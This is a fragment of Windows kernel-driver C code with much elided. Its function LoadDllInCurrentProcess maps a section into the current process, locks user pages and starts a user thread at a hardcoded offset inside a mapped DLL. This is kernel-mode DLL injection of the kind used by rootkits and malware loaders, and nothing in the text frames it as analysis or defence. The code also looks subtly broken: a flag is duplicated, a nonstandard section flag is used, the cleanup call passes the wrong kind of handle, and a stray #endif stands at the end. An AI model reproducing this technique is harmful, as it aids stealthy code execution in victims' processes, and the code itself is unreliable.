...
NTSTATUS                LoadDllInCurrentProcess(__in PVOID Kernel32Address, __in SIZE_T Kernel32Size)
{
	...
	Status = ObOpenObjectByPointer(PsGetCurrentProcess(), OBJ_KERNEL_HANDLE, NULL, STANDARD_RIGHTS_WRITE, NULL, KernelMode, &ProcessHandle);
	...
	Status = ZwCreateSection(&InputSectionHandle, SECTION_MAP_READ |SECTION_MAP_WRITE|SECTION_MAP_EXECUTE| SECTION_MAP_EXECUTE| SECTION_QUERY, &ObjectAttributes, &MappingSize, PAGE_READWRITE, SEC_COMMIT | SEC_CONTROL, NULL);
	if (!NT_SUCCESS(Status))
	{
	...
	ViewSize = PAGE_SIZE;
	Status = ZwMapViewOfSection(InputSectionHandle, ProcessHandle, &InputMappingAddress, 0, PAGE_SIZE, 0, &ViewSize, ViewUnmap, 0, PAGE_READWRITE);
	if (!NT_SUCCESS(Status))
	{
		ZwUnmapViewOfSection(ProcessHandle, DllSectionHandle);
	...
	__try
	{
		MmProbeAndLockPages(ParamMDL, UserMode, IoModifyAccess);
	}
	...
	Status = RtlCreateUserThreadPtr(ProcessHandle, NULL, FALSE, 0, 0, 0, (PUCHAR)DllMappingAddress + 0x430, InputMappingAddress, &ThreadHandle, &ClientID);
#endif
